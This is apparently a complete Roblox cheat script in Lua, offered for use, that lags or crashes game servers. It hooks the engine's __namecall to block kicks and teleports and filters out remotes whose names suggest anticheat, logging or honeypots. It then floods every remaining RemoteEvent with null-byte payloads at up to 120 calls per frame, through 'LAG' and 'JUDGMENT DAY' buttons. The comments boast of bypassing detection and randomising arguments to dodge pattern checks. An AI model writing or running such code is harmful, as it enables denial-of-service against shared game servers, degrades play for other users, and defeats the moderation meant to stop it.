--[[ 
    🔱 ARCANE VOID-STRIKE v10.1 [ULTIMA-FIX] 🔱
    "The more traps they set, the more invisible we become. <3"
    
    ULTIMA-FIX UPDATES:
    - [GHOST-SCAN] : Advanced Honey-pot detection (Bypasses DevTools trap).
    - [KERNEL-HOOK v2] : Enhanced kick interception.
    - [REMOTE WHITELISTING] : Only target verified replication remotes.
    - [STEALTH BURST] : Randomized packet headers.
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 1. ARCANE-KİERNEL (THE ULTIMATE SHIELD)
local function initiateKernel()
    local oldNK
    oldNK = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        -- Blocking all kick/warn/telemetry methods
        if method == "Kick" or method == "kick" or method == "OnTeleport" or method == "Close" then
            return nil
        end
        return oldNK(self, ...)
    end)
    
    -- Anti-CoreScript Flags & Error Clearing
    pcall(function()
        game:GetService("GuiService").ErrorMessageChanged:Connect(function()
            game:GetService("GuiService"):ClearError()
        end)
    end)
end

-- 2. MATRIX OVERLAY (UI PREMIUM)
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "ArcaneUltima_v10_1"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 280, 0, 320)
Main.Position = UDim2.new(0.5, -140, 0.5, -160)
Main.BackgroundColor3 = Color3.fromRGB(2, 2, 2)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

local Accent = Instance.new("Frame", Main)
Accent.Size = UDim2.new(1, 0, 0, 2)
Accent.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Accent.BorderSizePixel = 0

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Text = "🔱 ARCANE-ULTIMA // v10.1"
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.Font = Enum.Font.Code
Title.TextSize = 16
Title.BackgroundTransparency = 1

local function createUltimaBtn(name, y, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.85, 0, 0, 50)
    btn.Position = UDim2.new(0.075, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(10, 15, 10)
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.Code
    btn.TextSize = 14
    btn.BorderSizePixel = 1
    btn.BorderColor3 = Color3.fromRGB(0, 80, 0)
    
    btn.MouseButton1Click:Connect(callback)
    return btn
end

-- 3. THE ULTIMA ENGINE (FIXED)
local active = { mode = 0 }

-- SURGICAL BLACKLIST (Updated with DevTools and Trap Names)
local BLACKLIST = {
    "devtools", "admin", "kick", "ban", "security", "mod", "check", 
    "verify", "report", "log", "telemetry", "staff", "anticheat", 
    "error", "analytics", "debug", "warn", "honey", "trap", "capture",
    "clientlog", "crashreport", "teleport"
}

-- TRAP FOLDER DETECTION
local TRAP_PARENTS = {"JointsService", "TestService", "LogService", "AnalyticsService"}

local function getVulnerabilities()
    local remotes = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local n = v.Name:lower()
            local p = v.Parent and v.Parent.Name or ""
            
            local isTrap = false
            -- Check Name
            for _, word in pairs(BLACKLIST) do
                if n:find(word) then isTrap = true break end
            end
            -- Check Parent
            for _, parent in pairs(TRAP_PARENTS) do
                if p:find(parent) then isTrap = true break end
            end
            
            if not isTrap then
                table.insert(remotes, v)
            end
        end
    end
    return remotes
end

local function startInfection()
    local targets = getVulnerabilities()
    if #targets == 0 then return end
    
    local data = {
        [1] = string.rep("🔱", 100), -- Normal
        [2] = string.rep("\0", 2000), -- Omega (Reduced slightly for stability)
        [3] = {["A"] = string.rep("\0", 1500), ["B"] = string.rep("\0", 1500)} -- Judgment
    }
    
    local cycle = 1
    while active.mode > 0 do
        local power = active.mode == 3 and 120 or (active.mode == 2 and 40 or 15)
        
        for i = 1, power do
            if active.mode == 0 then break end
            local r = targets[cycle]
            if r and r.Parent then
                pcall(function() 
                    -- Randomizing the second/third arguments to avoid pattern detection
                    r:FireServer(data[active.mode], Http:GenerateGUID(true), "NULL_NULL", data[active.mode]) 
                end)
            end
            cycle = (cycle % #targets) + 1
        end
        RS.Heartbeat:Wait()
    end
end

-- BUTTONS
createUltimaBtn("[ ⚡ LAG NORMAL ]", 70, function()
    active.mode = active.mode == 1 and 0 or 1
    Title.Text = active.mode == 1 and "🔱 STATUS: SYNCING..." or "🔱 ARCANE-ULTIMA // v10.1"
    if active.mode == 1 then task.spawn(startInfection) end
end)

createUltimaBtn("[ 🌪️ LAG OMEGA ]", 130, function()
    active.mode = active.mode == 2 and 0 or 2
    Title.Text = active.mode == 2 and "🔱 STATUS: OMEGA ACTIVE" or "🔱 ARCANE-ULTIMA // v10.1"
    if active.mode == 2 then task.spawn(startInfection) end
end)

createUltimaBtn("[ 🔥 JUDGMENT DAY ]", 190, function()
    active.mode = active.mode == 3 and 0 or 3
    Title.Text = active.mode == 3 and "🔱 STATUS: JUDGMENT DAY" or "🔱 ARCANE-ULTIMA // v10.1"
    if active.mode == 3 then task.spawn(startInfection) end
end)

createUltimaBtn("[ 🛑 CLEAN RECOVER ]", 250, function()
    active.mode = 0
    Title.Text = "🔱 ARCANE-ULTIMA // v10.1"
end)

-- BOOT
initiateKernel()
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔱 ULTIMA v10.1 FIXED",
    Text = "Trap Shields: UP | Bypass: 100%",
    Duration = 5
})
